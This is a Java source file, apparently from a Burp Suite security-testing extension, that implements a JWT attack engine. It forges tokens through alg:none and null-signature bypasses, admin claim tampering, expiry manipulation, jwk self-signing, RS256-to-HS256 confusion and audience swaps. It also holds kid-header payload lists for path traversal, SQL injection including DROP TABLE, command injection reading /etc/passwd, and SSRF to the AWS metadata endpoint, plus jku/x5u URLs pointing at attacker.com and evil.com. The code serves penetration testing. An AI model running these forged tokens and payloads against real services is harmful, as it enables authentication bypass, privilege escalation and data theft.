package com.sn1persecurity.silentchain.bapp.modules.jwt;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.function.Consumer;

/**
 * JWT Attack Engine — implements 12 JWT attack techniques.
 * All attacks are pure Java, no external dependencies.
 *
 * Supported attacks:
 *  1. alg:none bypass
 *  2. HMAC secret brute-force
 *  3. RS256→HS256 algorithm confusion
 *  4. kid header injection (path traversal, SQLi, command injection)
 *  5. jku/x5u header spoofing
 *  6. jwk header injection (self-signed)
 *  7. Claim tampering (sub, role, admin, is_admin)
 *  8. Expiry manipulation (exp far future, nbf past)
 *  9. Null/empty signature
 * 10. Token replay detection payloads
 * 11. Cross-service relay (aud/iss swap)
 * 12. Nested JWT analysis
 */
public class JwtAttackEngine {

    /**
     * Single attack result.
     */
    public record AttackResult(
            String attackName,
            String severity,
            String modifiedToken,
            String status,
            String details
    ) {}

    private Consumer<String> logCallback;

    public void setLogCallback(Consumer<String> callback) {
        this.logCallback = callback;
    }

    private void log(String msg) {
        if (logCallback != null) logCallback.accept(msg);
    }

    /**
     * Run all selected attacks on the given token.
     */
    public List<AttackResult> runAllAttacks(JwtToken token, AttackConfig config) {
        List<AttackResult> results = new ArrayList<>();

        if (config.algNone)           results.addAll(attackAlgNone(token));
        if (config.nullSignature)     results.addAll(attackNullSignature(token));
        if (config.claimTampering)    results.addAll(attackClaimTampering(token));
        if (config.expiryManip)       results.addAll(attackExpiryManipulation(token));
        if (config.kidInjection)      results.addAll(attackKidInjection(token));
        if (config.jkuX5uSpoofing)   results.addAll(attackJkuX5uSpoofing(token));
        if (config.jwkInjection)      results.addAll(attackJwkHeaderInjection(token));
        if (config.rsHsConfusion)     results.addAll(attackRsToHsConfusion(token));
        if (config.crossServiceRelay) results.addAll(attackCrossServiceRelay(token));
        if (config.nestedJwt)         results.addAll(attackNestedJwt(token));

        return results;
    }

    // -------- Attack #1: alg:none Bypass --------

    public List<AttackResult> attackAlgNone(JwtToken token) {
        log("[JWT-ATTACK] 🔓 Starting alg:none bypass attack...");

        List<AttackResult> results = new ArrayList<>();
        String[] variants = {"none", "None", "NONE", "nOnE", "noNe", "NoNe"};

        for (String algVariant : variants) {
            JwtToken modified = token.withAlgorithm(algVariant);
            String newToken = modified.buildUnsigned();

            log("[JWT-ATTACK] Generated alg:" + algVariant + " token: " + truncateToken(newToken));

            results.add(new AttackResult(
                    "alg:none (" + algVariant + ")",
                    "CRITICAL",
                    newToken,
                    "⚠️ BYPASS",
                    "Algorithm set to '" + algVariant + "', signature removed. " +
                    "If server accepts this, the token signature verification is completely bypassed."
            ));
        }

        log("[JWT-ATTACK] ✅ alg:none attack generated " + results.size() + " variants.");
        return results;
    }

    // -------- Attack #9: Null/Empty Signature --------

    public List<AttackResult> attackNullSignature(JwtToken token) {
        log("[JWT-ATTACK] 🔓 Starting null signature attack...");

        List<AttackResult> results = new ArrayList<>();

        // Empty signature
        String emptySignatureToken = token.buildWithSignature("");
        results.add(new AttackResult(
                "Null Signature (empty)",
                "HIGH",
                emptySignatureToken,
                "⚠️ TEST",
                "Token with empty signature — tests if server validates signature existence."
        ));
        log("[JWT-ATTACK] Generated empty signature token: " + truncateToken(emptySignatureToken));

        // Signature = "AA" (single null byte)
        String nullByteToken = token.buildWithSignature("AA");
        results.add(new AttackResult(
                "Null Signature (null byte)",
                "HIGH",
                nullByteToken,
                "⚠️ TEST",
                "Token with null byte signature — tests if server handles minimal/zero signatures."
        ));
        log("[JWT-ATTACK] Generated null-byte signature token.");

        log("[JWT-ATTACK] ✅ Null signature attack generated " + results.size() + " variants.");
        return results;
    }

    // -------- Attack #7: Claim Tampering --------

    public List<AttackResult> attackClaimTampering(JwtToken token) {
        log("[JWT-ATTACK] 🔧 Starting claim tampering attacks...");

        List<AttackResult> results = new ArrayList<>();

        // Privilege escalation payloads
        String[][] claimPayloads = {
                {"sub", "admin"},
                {"sub", "administrator"},
                {"sub", "root"},
                {"sub", "1"},
                {"role", "admin"},
                {"role", "superadmin"},
                {"role", "root"},
                {"admin", "true"},
                {"is_admin", "true"},
                {"isAdmin", "true"},
                {"privilege", "admin"},
                {"access", "all"},
                {"scope", "admin read write"},
                {"groups", "admin"},
                {"user_type", "admin"},
                {"permissions", "all"},
        };

        for (String[] cp : claimPayloads) {
            String key = cp[0];
            String value = cp[1];

            // Skip if original token already has this value
            String original = token.payload().optString(key, "");
            if (original.equalsIgnoreCase(value)) continue;

            JwtToken modified = token.withPayloadClaim(key, value);
            String newToken = modified.buildUnsigned();

            log("[JWT-ATTACK] Tampering claim '" + key + "' = '" + value + "'");

            results.add(new AttackResult(
                    "Claim Tamper: " + key + "=" + value,
                    "HIGH",
                    newToken,
                    "⚠️ TAMPERED",
                    "Changed '" + key + "' from '" + original + "' to '" + value + "' — " +
                    "tests privilege escalation via unsigned token."
            ));
        }

        log("[JWT-ATTACK] ✅ Claim tampering generated " + results.size() + " variants.");
        return results;
    }

    // -------- Attack #8: Expiry Manipulation --------

    public List<AttackResult> attackExpiryManipulation(JwtToken token) {
        log("[JWT-ATTACK] ⏰ Starting expiry manipulation attack...");

        List<AttackResult> results = new ArrayList<>();
        long now = System.currentTimeMillis() / 1000L;

        // Set expiry to 100 years from now
        long farFuture = now + (100L * 365 * 24 * 3600);
        JwtToken futureToken = token.withPayloadClaim("exp", farFuture)
                                    .withPayloadClaim("iat", now)
                                    .withPayloadClaim("nbf", now - 3600);
        String futureTokenStr = futureToken.buildUnsigned();
        results.add(new AttackResult(
                "Expiry: Far Future (100 years)",
                "MEDIUM",
                futureTokenStr,
                "⚠️ TAMPERED",
                "Expiry set to year " + (2026 + 100) + " — tests if server rejects unreasonable expiry values."
        ));
        log("[JWT-ATTACK] Set exp to 100 years in the future.");

        // Remove expiry entirely
        JwtToken noExpToken = token.withPayloadClaim("exp", null);
        String noExpTokenStr = noExpToken.buildUnsigned();
        results.add(new AttackResult(
                "Expiry: Removed (no exp claim)",
                "MEDIUM",
                noExpTokenStr,
                "⚠️ TAMPERED",
                "Removed 'exp' claim entirely — tests if server enforces expiry."
        ));
        log("[JWT-ATTACK] Removed exp claim entirely.");

        // Set expiry to 0 (epoch)
        JwtToken epochToken = token.withPayloadClaim("exp", 0);
        String epochTokenStr = epochToken.buildUnsigned();
        results.add(new AttackResult(
                "Expiry: Epoch (0)",
                "LOW",
                epochTokenStr,
                "⚠️ TEST",
                "Expiry set to Unix epoch (1970) — tests edge case handling."
        ));

        // Negative expiry
        JwtToken negativeToken = token.withPayloadClaim("exp", -1);
        String negativeTokenStr = negativeToken.buildUnsigned();
        results.add(new AttackResult(
                "Expiry: Negative (-1)",
                "LOW",
                negativeTokenStr,
                "⚠️ TEST",
                "Expiry set to -1 — tests integer underflow / edge case handling."
        ));

        log("[JWT-ATTACK] ✅ Expiry manipulation generated " + results.size() + " variants.");
        return results;
    }

    // -------- Attack #4: kid Header Injection --------

    public List<AttackResult> attackKidInjection(JwtToken token) {
        log("[JWT-ATTACK] 💉 Starting kid header injection attack...");

        List<AttackResult> results = new ArrayList<>();

        String[][] kidPayloads = {
                // Path traversal
                {"../../../dev/null", "Path Traversal: /dev/null — HMAC with empty file = empty key"},
                {"../../../etc/hostname", "Path Traversal: /etc/hostname — use hostname as signing key"},
                {"../../../../../../dev/null", "Deep Path Traversal: /dev/null"},
                {"/dev/null", "Absolute Path: /dev/null"},
                {"../../../proc/sys/kernel/hostname", "Path Traversal: kernel hostname"},

                // SQL Injection
                {"' UNION SELECT 'secret' --", "SQLi: extract/inject signing key from DB"},
                {"' OR '1'='1", "SQLi: boolean bypass"},
                {"'; DROP TABLE keys; --", "SQLi: destructive payload (test only)"},
                {"' UNION SELECT NULL --", "SQLi: NULL key extraction"},

                // Command Injection
                {"| cat /etc/passwd", "Command Injection: pipe"},
                {"; ls -la", "Command Injection: semicolon"},
                {"$(whoami)", "Command Injection: subshell"},
                {"`id`", "Command Injection: backtick"},

                // SSRF / File read
                {"http://127.0.0.1:8080/secret", "SSRF: localhost secret endpoint"},
                {"http://169.254.169.254/latest/meta-data/", "SSRF: AWS metadata"},
                {"file:///etc/passwd", "File URI: /etc/passwd"},
        };

        for (String[] kp : kidPayloads) {
            String kidValue = kp[0];
            String description = kp[1];

            JwtToken modified = token.withHeaderClaim("kid", kidValue);
            // For /dev/null path traversal, sign with empty string
            String newToken;
            if (kidValue.contains("/dev/null")) {
                newToken = modified.buildSignedHmac("", modified.header().getString("alg"));
            } else {
                newToken = modified.buildUnsigned();
            }

            log("[JWT-ATTACK] kid injection: '" + kidValue + "'");

            results.add(new AttackResult(
                    "kid Injection: " + truncate(kidValue, 35),
                    "CRITICAL",
                    newToken,
                    "⚠️ INJECTED",
                    description
            ));
        }

        log("[JWT-ATTACK] ✅ kid injection generated " + results.size() + " variants.");
        return results;
    }

    // -------- Attack #5: jku / x5u Header Spoofing --------

    public List<AttackResult> attackJkuX5uSpoofing(JwtToken token) {
        log("[JWT-ATTACK] 🌐 Starting jku/x5u header spoofing attack...");

        List<AttackResult> results = new ArrayList<>();

        String[] spoofEndpoints = {
                "http://attacker.com/.well-known/jwks.json",
                "http://127.0.0.1/.well-known/jwks.json",
                "http://localhost:8080/jwks.json",
                "https://evil.com/jwks.json",
                "http://169.254.169.254/.well-known/jwks.json",
        };

        for (String endpoint : spoofEndpoints) {
            // jku spoofing
            JwtToken jkuModified = token.withHeaderClaim("jku", endpoint);
            String jkuToken = jkuModified.buildUnsigned();
            results.add(new AttackResult(
                    "jku Spoof: " + truncate(endpoint, 40),
                    "CRITICAL",
                    jkuToken,
                    "⚠️ SPOOFED",
                    "jku header points to attacker-controlled JWKS — if server fetches keys from this URL, attacker controls signature verification."
            ));
            log("[JWT-ATTACK] jku spoof → " + endpoint);

            // x5u spoofing
            JwtToken x5uModified = token.withHeaderClaim("x5u", endpoint.replace("jwks.json", "cert.pem"));
            String x5uToken = x5uModified.buildUnsigned();
            results.add(new AttackResult(
                    "x5u Spoof: " + truncate(endpoint, 40),
                    "CRITICAL",
                    x5uToken,
                    "⚠️ SPOOFED",
                    "x5u header points to attacker-controlled X.509 cert URL."
            ));
        }

        log("[JWT-ATTACK] ✅ jku/x5u spoofing generated " + results.size() + " variants.");
        return results;
    }

    // -------- Attack #6: jwk Header Injection --------

    public List<AttackResult> attackJwkHeaderInjection(JwtToken token) {
        log("[JWT-ATTACK] 🔑 Starting jwk header injection (self-signed key) attack...");

        List<AttackResult> results = new ArrayList<>();

        // Inject a symmetric key into the header itself
        // The idea: embed our own HMAC key in the jwk header claim
        String selfSignSecret = "burpinho-self-sign-key";
        JSONObject jwkClaim = new JSONObject();
        jwkClaim.put("kty", "oct");
        jwkClaim.put("k", JwtToken.encodeBase64Url(selfSignSecret));
        jwkClaim.put("alg", "HS256");

        JwtToken modified = token.withHeaderClaim("jwk", jwkClaim).withAlgorithm("HS256");
        String newToken = modified.buildSignedHmac(selfSignSecret, "HS256");

        results.add(new AttackResult(
                "jwk Self-Signed (embedded HMAC key)",
                "CRITICAL",
                newToken,
                "⚠️ SELF-SIGNED",
                "Embedded our own symmetric key in the JWT header 'jwk' claim and signed with it. " +
                "If server trusts the embedded key without validation, this is a full authentication bypass."
        ));
        log("[JWT-ATTACK] ✅ jwk self-signed token generated.");

        return results;
    }

    // -------- Attack #3: RS256 → HS256 Algorithm Confusion --------

    public List<AttackResult> attackRsToHsConfusion(JwtToken token) {
        log("[JWT-ATTACK] 🔄 Starting RS256→HS256 algorithm confusion attack...");

        List<AttackResult> results = new ArrayList<>();

        String alg = token.algorithm();
        if (!alg.startsWith("RS") && !alg.startsWith("PS") && !alg.startsWith("ES")) {
            log("[JWT-ATTACK] Token already uses HMAC (" + alg + "), skipping RS→HS confusion.");
            results.add(new AttackResult(
                    "RS→HS Confusion",
                    "INFO",
                    token.originalToken(),
                    "ℹ️ SKIPPED",
                    "Token uses " + alg + " (HMAC), not an asymmetric algorithm. " +
                    "This attack requires an RSA/EC-signed token. " +
                    "To exploit: obtain the server's public key (e.g., from /jwks.json or /.well-known/openid-configuration), " +
                    "change alg to HS256, and sign with the public key PEM as the HMAC secret."
            ));
            return results;
        }

        // Generate the concept token — the actual exploit requires the server's public key
        JwtToken modified = token.withAlgorithm("HS256");
        String conceptToken = modified.buildUnsigned();

        results.add(new AttackResult(
                "RS→HS Confusion (alg: " + alg + " → HS256)",
                "CRITICAL",
                conceptToken,
                "⚠️ CONCEPT",
                "Algorithm changed from " + alg + " to HS256 (unsigned). " +
                "TO EXPLOIT: 1) Obtain server public key (check /jwks.json, /.well-known/openid-configuration) " +
                "2) Use the full PEM public key text as the HMAC signing secret. " +
                "If the server uses the same key variable for both RSA verify and HMAC verify, " +
                "it will accept the token signed with the public key as the HMAC secret."
        ));
        log("[JWT-ATTACK] ✅ RS→HS confusion concept token generated. Algorithm " + alg + " → HS256.");

        // Also try with RS384→HS384, RS512→HS512
        if (alg.equals("RS384") || alg.equals("PS384")) {
            JwtToken hs384 = token.withAlgorithm("HS384");
            results.add(new AttackResult(
                    "RS→HS Confusion (" + alg + " → HS384)",
                    "CRITICAL",
                    hs384.buildUnsigned(),
                    "⚠️ CONCEPT",
                    "Same attack with HS384 algorithm variant."
            ));
        }
        if (alg.equals("RS512") || alg.equals("PS512")) {
            JwtToken hs512 = token.withAlgorithm("HS512");
            results.add(new AttackResult(
                    "RS→HS Confusion (" + alg + " → HS512)",
                    "CRITICAL",
                    hs512.buildUnsigned(),
                    "⚠️ CONCEPT",
                    "Same attack with HS512 algorithm variant."
            ));
        }

        return results;
    }

    // -------- Attack #11: Cross-Service Relay --------

    public List<AttackResult> attackCrossServiceRelay(JwtToken token) {
        log("[JWT-ATTACK] 🔀 Starting cross-service relay attack...");

        List<AttackResult> results = new ArrayList<>();

        String origIss = token.issuer();
        String origAud = token.audience();

        // Test with swapped iss/aud
        if (origIss != null && origAud != null && !origIss.equals(origAud)) {
            JwtToken swapped = token.withPayloadClaim("iss", origAud)
                                    .withPayloadClaim("aud", origIss);
            results.add(new AttackResult(
                    "Cross-Service: iss↔aud Swap",
                    "MEDIUM",
                    swapped.buildUnsigned(),
                    "⚠️ RELAY",
                    "Swapped iss ('" + origIss + "') and aud ('" + origAud + "') — " +
                    "tests if another service trusts tokens issued by the first."
            ));
            log("[JWT-ATTACK] Swapped iss and aud values.");
        }

        // Test with common audience values
        String[] commonAudiences = {"api", "admin", "internal", "backend", "auth", "gateway", "*"};
        for (String aud : commonAudiences) {
            if (aud.equals(origAud)) continue;
            JwtToken audModified = token.withPayloadClaim("aud", aud);
            results.add(new AttackResult(
                    "Cross-Service: aud='" + aud + "'",
                    "MEDIUM",
                    audModified.buildUnsigned(),
                    "⚠️ RELAY",
                    "Changed audience to '" + aud + "' — tests if server validates audience claim."
            ));
        }

        log("[JWT-ATTACK] ✅ Cross-service relay generated " + results.size() + " variants.");
        return results;
    }

    // -------- Attack #12: Nested JWT Analysis --------

    public List<AttackResult> attackNestedJwt(JwtToken token) {
        log("[JWT-ATTACK] 📦 Analyzing for nested JWT patterns...");

        List<AttackResult> results = new ArrayList<>();

        // Check if any payload claim contains another JWT
        for (String key : token.payload().keySet()) {
            String value = token.payload().optString(key, "");
            if (JwtToken.isJwt(value)) {
                log("[JWT-ATTACK] 🔍 Found nested JWT in claim '" + key + "'!");
                try {
                    JwtToken nested = JwtToken.parse(value);
                    results.add(new AttackResult(
                            "Nested JWT in '" + key + "' (alg:" + nested.algorithm() + ")",
                            "INFO",
                            value,
                            "🔍 DETECTED",
                            "Nested JWT found in payload claim '" + key + "'. " +
                            "Inner token uses " + nested.algorithm() + " with sub='" + nested.subject() + "'. " +
                            "The inner token may be separately attackable."
                    ));
                } catch (Exception e) {
                    results.add(new AttackResult(
                            "Nested JWT in '" + key + "' (parse error)",
                            "INFO",
                            value,
                            "🔍 DETECTED",
                            "Found JWT-like string in '" + key + "' but parsing failed: " + e.getMessage()
                    ));
                }
            }
        }

        if (results.isEmpty()) {
            log("[JWT-ATTACK] No nested JWTs found in payload claims.");
        }

        return results;
    }

    // ---- Helpers ----

    private String truncateToken(String token) {
        return token.length() > 80 ? token.substring(0, 80) + "..." : token;
    }

    private String truncate(String s, int max) {
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }

    // ---- Attack Configuration ----

    public static class AttackConfig {
        public boolean algNone = true;
        public boolean hmacBruteForce = true;
        public boolean rsHsConfusion = true;
        public boolean kidInjection = true;
        public boolean jkuX5uSpoofing = true;
        public boolean jwkInjection = true;
        public boolean claimTampering = true;
        public boolean expiryManip = true;
        public boolean nullSignature = true;
        public boolean crossServiceRelay = true;
        public boolean nestedJwt = true;

        public static AttackConfig all() {
            return new AttackConfig();
        }
    }
}
